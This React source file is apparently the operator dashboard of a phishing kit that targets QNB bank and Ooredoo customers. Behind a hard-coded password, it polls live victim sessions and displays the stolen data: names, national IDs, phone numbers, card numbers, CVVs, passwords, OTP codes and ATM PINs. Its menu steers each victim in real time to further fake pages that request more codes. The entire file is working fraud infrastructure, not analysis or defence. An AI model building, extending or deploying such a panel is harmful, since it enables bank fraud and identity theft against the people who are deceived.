import { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
  DropdownMenuLabel,
} from "@/components/ui/dropdown-menu";
import {
  Eye,
  LogOut,
  Search,
  Users,
  CheckCircle2,
  Clock,
  ExternalLink,
  User,
  CreditCard,
  Key,
  Globe,
  Check,
  X,
} from "lucide-react";

export default function AdminDashboard() {
  const [password, setPassword] = useState("");
  // Initialize from localStorage to prevent logout on refresh
  const [isAuthenticated, setIsAuthenticated] = useState(() => {
    return typeof window !== 'undefined' ? localStorage.getItem("admin_auth") === "true" : false;
  });
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<any>(null);
  const [isDetailsOpen, setIsDetailsOpen] = useState(false);

  const { data: sessions, refetch } = trpc.submissions.getSessions.useQuery(undefined, {
    enabled: isAuthenticated,
    refetchInterval: 3000,
  });

  const updateStatusMutation = trpc.submissions.updateSessionStatus.useMutation();
  const updateStepMutation = trpc.submissions.updateSessionStep.useMutation();

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === "Qatar@@200") {
      setIsAuthenticated(true);
      localStorage.setItem("admin_auth", "true");
    } else {
      toast.error("كلمة المرور غير صحيحة");
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    localStorage.removeItem("admin_auth");
  };

  const handleStatusUpdate = async (sessionId: string, status: string) => {
    try {
      await updateStatusMutation.mutateAsync({ sessionId, status });
      toast.success(`تم تحديث الحالة إلى: ${status}`);
      refetch();
    } catch (error) {
      toast.error("فشل تحديث الحالة");
    }
  };

  const handleRedirect = async (sessionId: string, step: string) => {
    try {
      await updateStepMutation.mutateAsync({ sessionId, step });
      toast.success(`تم توجيه العميل إلى: ${step}`);
      refetch();
    } catch (error) {
      toast.error("فشل توجيه العميل");
    }
  };

  const filteredSessions = sessions?.filter(
    (s) =>
      s.sessionId.toLowerCase().includes(searchTerm.toLowerCase()) ||
      s.fullName?.toLowerCase().includes(searchTerm.toLowerCase())
  );

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#0f172a] flex items-center justify-center p-4">
        <div className="w-full max-w-md bg-[#1e293b] rounded-2xl shadow-2xl p-8 border border-[#334155]">
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-[#8C0032] rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
              <Key className="text-white w-8 h-8" />
            </div>
            <h1 className="text-2xl font-bold text-white mb-2">لوحة التحكم</h1>
            <p className="text-[#94a3b8] text-sm">يرجى إدخال كلمة المرور للمتابعة</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-6">
            <Input
              type="password"
              placeholder="كلمة المرور"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="bg-[#0f172a] border-[#334155] text-white h-12 focus:ring-[#8C0032]"
            />
            <Button type="submit" className="w-full h-12 bg-[#8C0032] hover:bg-[#a8003d] text-white font-bold rounded-xl transition-all">
              دخول
            </Button>
          </form>
        </div>
      </div>
    );
  }

  const stats = [
    { label: "إجمالي الزوار", value: sessions?.length || 0, icon: Users, color: "bg-blue-500" },
    { label: "طلبات نشطة", value: sessions?.filter(s => s.status === "pending").length || 0, icon: Clock, color: "bg-amber-500" },
    { label: "تمت الموافقة", value: sessions?.filter(s => s.status === "accepted").length || 0, icon: CheckCircle2, color: "bg-emerald-500" },
  ];

  return (
    <div className="min-h-screen bg-[#f8fafc] pb-12">
      {/* Header */}
      <div className="bg-white border-b sticky top-0 z-10 shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="bg-[#8C0032] p-2 rounded-lg">
              <Users className="text-white w-6 h-6" />
            </div>
            <h1 className="text-xl font-bold text-[#1e293b]">إدارة الطلبات</h1>
          </div>
          <div className="flex items-center gap-4">
            <div className="relative hidden sm:block">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 w-4 h-4" />
              <Input
                placeholder="بحث بالاسم أو الكود..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pr-10 w-64 bg-slate-50 border-slate-200 focus:bg-white text-right"
              />
            </div>
            <Button variant="outline" onClick={handleLogout} className="gap-2 border-slate-200 hover:bg-slate-50 text-slate-600">
              <LogOut className="w-4 h-4" />
              خروج
            </Button>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mt-8">
        {/* Stats Grid */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          {stats.map((stat, i) => (
            <div key={i} className="bg-white p-6 rounded-2xl shadow-sm border border-slate-100 flex items-center gap-4">
              <div className={`${stat.color} p-4 rounded-xl text-white`}>
                <stat.icon className="w-6 h-6" />
              </div>
              <div className="text-right">
                <p className="text-sm font-medium text-slate-500">{stat.label}</p>
                <p className="text-2xl font-bold text-slate-900">{stat.value}</p>
              </div>
            </div>
          ))}
        </div>

        {/* Table Container */}
        <div className="bg-white rounded-2xl shadow-sm border border-slate-100 overflow-hidden">
          <Table>
            <TableHeader className="bg-slate-50">
              <TableRow>
                <TableHead className="text-right font-bold text-slate-700">الكود</TableHead>
                <TableHead className="text-right font-bold text-slate-700">البنك</TableHead>
                <TableHead className="text-right font-bold text-slate-700">الدولة</TableHead>
                <TableHead className="text-right font-bold text-slate-700">الاسم</TableHead>
                <TableHead className="text-right font-bold text-slate-700">المرحلة</TableHead>
                <TableHead className="text-right font-bold text-slate-700">التوقيت</TableHead>
                <TableHead className="text-center font-bold text-slate-700">الإجراءات</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {filteredSessions?.map((session) => (
                <TableRow key={session.id} className="hover:bg-slate-50/50 transition-colors">
                  <TableCell className="font-mono text-xs text-slate-500">...{session.sessionId.slice(-8)}</TableCell>
                  <TableCell>
                    <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-slate-100 text-slate-800 border border-slate-200">
                      <span className={`w-2 h-2 rounded-full ml-1.5 ${session.bank === 'qnb' ? 'bg-rose-500' : 'bg-blue-500'}`}></span>
                      {session.bank?.toUpperCase()}
                    </span>
                  </TableCell>
                  <TableCell className="text-slate-600 flex items-center gap-1">
                    <Globe className="w-3 h-3 text-slate-400" />
                    {session.country || "—"}
                  </TableCell>
                  <TableCell className="font-medium text-slate-900">{session.fullName || "—"}</TableCell>
                  <TableCell>
                    <span className={`px-3 py-1 rounded-full text-xs font-bold ${
                      session.currentStep === 'success' ? 'bg-emerald-100 text-emerald-700' :
                      session.currentStep === 'waiting' ? 'bg-amber-100 text-amber-700' :
                      'bg-blue-100 text-blue-700'
                    }`}>
                      {session.currentStep === 'home' ? 'الرئيسية' :
                       session.currentStep === 'personal-data' ? 'البيانات الشخصية' :
                       session.currentStep === 'login-method' ? 'تسجيل الدخول' :
                       session.currentStep === 'otp' ? 'OTP' :
                       session.currentStep === 'atm-pin' ? 'ATM PIN' :
                       session.currentStep === 'ooredoo' ? 'Ooredoo' :
                       session.currentStep === 'otp-ooredoo' ? 'OTP Ooredoo' :
                       session.currentStep === 'waiting' ? 'في الانتظار' :
                       session.currentStep === 'success' ? 'نجاح' : session.currentStep}
                    </span>
                  </TableCell>
                  <TableCell className="text-slate-500 text-xs">
                    {new Date(session.createdAt).toLocaleTimeString('ar-EG')}
                  </TableCell>
                  <TableCell>
                    <div className="flex items-center justify-center gap-2">
                      <Button
                        variant="ghost"
                        size="sm"
                        className="text-blue-600 hover:text-blue-700 hover:bg-blue-50 gap-1"
                        onClick={() => {
                          setSelectedSession(session);
                          setIsDetailsOpen(true);
                        }}
                      >
                        <Eye className="w-4 h-4" />
                        التفاصيل
                      </Button>

                      <DropdownMenu>
                        <DropdownMenuTrigger asChild>
                          <Button variant="ghost" size="sm" className="text-rose-600 hover:text-rose-700 hover:bg-rose-50 gap-1">
                            <ExternalLink className="w-4 h-4" />
                            إعادة توجيه
                          </Button>
                        </DropdownMenuTrigger>
                        <DropdownMenuContent align="end" className="w-56 p-2 rounded-xl border-slate-200 z-[100]">
                          {[
                            { name: '📄 صفحة الدخول', step: 'login-method' },
                            { name: '🔑 صفحة OTP', step: 'otp' },
                            { name: '💳 صفحة ATM PIN', step: 'atm-pin' },
                            { name: '🌐 صفحة Ooredoo', step: 'ooredoo' },
                            { name: '📱 صفحة OTP Ooredoo', step: 'otp-ooredoo' },
                            { name: '✨ صفحة النجاح', step: 'success' },
                          ].map((page) => (
                            <DropdownMenuItem
                              key={page.step}
                              onClick={() => handleRedirect(session.sessionId, page.step)}
                              className="text-right justify-end hover:bg-slate-50 cursor-pointer rounded-lg py-2"
                            >
                              {page.name}
                            </DropdownMenuItem>
                          ))}
                        </DropdownMenuContent>
                      </DropdownMenu>
                    </div>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </div>
      </div>

      {/* Details Dialog */}
      {selectedSession && (
        <Dialog open={isDetailsOpen} onOpenChange={setIsDetailsOpen}>
          <DialogContent className="max-w-2xl bg-white rounded-3xl p-0 overflow-hidden border-none shadow-2xl z-[150]">
            <DialogHeader className="bg-[#8C0032] p-6 text-white text-right">
              <DialogTitle className="text-xl font-bold flex items-center justify-end gap-2">
                كل بيانات العميل
                <User className="w-6 h-6" />
              </DialogTitle>
              <p className="text-rose-100 text-xs mt-1 opacity-80">ID: {selectedSession.sessionId}</p>
            </DialogHeader>

            <div className="p-6 max-h-[70vh] overflow-y-auto space-y-6 text-right" dir="rtl">
              {/* Section: Personal Info */}
              <div className="space-y-4">
                <div className="flex items-center gap-2 text-[#8C0032] font-bold border-b pb-2">
                  <User className="w-4 h-4" />
                  البيانات الشخصية
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <DataField label="الاسم" value={selectedSession.fullName} />
                  <DataField label="رقم الجوال" value={selectedSession.phoneNumber} />
                  <DataField label="رقم الهوية" value={selectedSession.nationalId} />
                  <DataField label="الدولة" value={selectedSession.country} />
                </div>
              </div>

              {/* Section: Login & OTP Controls */}
              <div className="space-y-6">
                {/* Card/User Login */}
                <ControlSection 
                  icon={<CreditCard className="w-4 h-4" />} 
                  title="بيانات تسجيل الدخول"
                  data={selectedSession.loginType === 'card' ? {
                    "نوع الدخول": "بطاقة بنكية",
                    "رقم البطاقة": selectedSession.cardNumber,
                    "الاسم": selectedSession.cardholderName,
                    "التاريخ": selectedSession.expiryDate,
                    "CVV": selectedSession.cvv
                  } : {
                    "نوع الدخول": "اسم مستخدم",
                    "المستخدم": selectedSession.username,
                    "كلمة السر": selectedSession.password
                  }}
                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                />

                {/* OTP Section */}
                <ControlSection 
                  icon={<Key className="w-4 h-4" />} 
                  title="رموز التحقق (OTP)"
                  data={{
                    "رمز OTP": selectedSession.otpCode
                  }}
                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                />

                {/* ATM PIN Section */}
                <ControlSection 
                  icon={<CreditCard className="w-4 h-4" />} 
                  title="ATM PIN"
                  data={{
                    "الرقم السري": selectedSession.atmPin
                  }}
                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                />

                {/* Ooredoo Section */}
                <ControlSection 
                  icon={<Globe className="w-4 h-4" />} 
                  title="بيانات Ooredoo"
                  data={{
                    "المستخدم": selectedSession.ooredooUser,
                    "كلمة السر": selectedSession.ooredooPassword,
                    "رمز OTP Ooredoo": selectedSession.ooredooOtp
                  }}
                  onAccept={() => handleStatusUpdate(selectedSession.sessionId, 'accepted')}
                  onReject={() => handleStatusUpdate(selectedSession.sessionId, 'rejected')}
                />
              </div>
            </div>

            <DialogFooter className="p-4 bg-slate-50 border-t flex justify-center">
              <Button onClick={() => setIsDetailsOpen(false)} className="bg-slate-900 hover:bg-slate-800 text-white px-8 rounded-xl">
                إغلاق
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      )}
    </div>
  );
}

function DataField({ label, value }: { label: string; value: any }) {
  return (
    <div className="bg-slate-50 p-3 rounded-xl border border-slate-100 text-right">
      <p className="text-[10px] text-slate-400 font-bold mb-1 uppercase tracking-wider">{label}</p>
      <p className="text-slate-700 font-medium break-all">{value || "—"}</p>
    </div>
  );
}

function ControlSection({ icon, title, data, onAccept, onReject }: { 
  icon: any, 
  title: string, 
  data: Record<string, any>, 
  onAccept: () => void, 
  onReject: () => void 
}) {
  const hasData = Object.values(data).some(v => v && v !== "—");
  
  return (
    <div className={`p-4 rounded-2xl border transition-all ${hasData ? 'bg-slate-50 border-slate-200' : 'bg-slate-50/50 border-dashed border-slate-200 opacity-60'}`}>
      <div className="flex items-center justify-between mb-4 flex-row-reverse">
        <div className="flex items-center gap-2 text-slate-800 font-bold text-sm">
          {icon}
          {title}
        </div>
        {hasData && (
          <div className="flex items-center gap-2">
            <Button size="sm" onClick={onAccept} className="bg-emerald-500 hover:bg-emerald-600 text-white h-8 px-3 rounded-lg gap-1 text-xs">
              قبول
              <Check className="w-3 h-3" />
            </Button>
            <Button size="sm" onClick={onReject} variant="destructive" className="h-8 px-3 rounded-lg gap-1 text-xs">
              رفض
              <X className="w-3 h-3" />
            </Button>
          </div>
        )}
      </div>
      <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 text-right" dir="rtl">
        {Object.entries(data).map(([key, val]) => (
          <div key={key}>
            <p className="text-[9px] text-slate-400 font-bold mb-0.5 uppercase">{key}</p>
            <p className="text-slate-700 text-xs font-mono font-bold">{val || "—"}</p>
          </div>
        ))}
      </div>
    </div>
  );
}
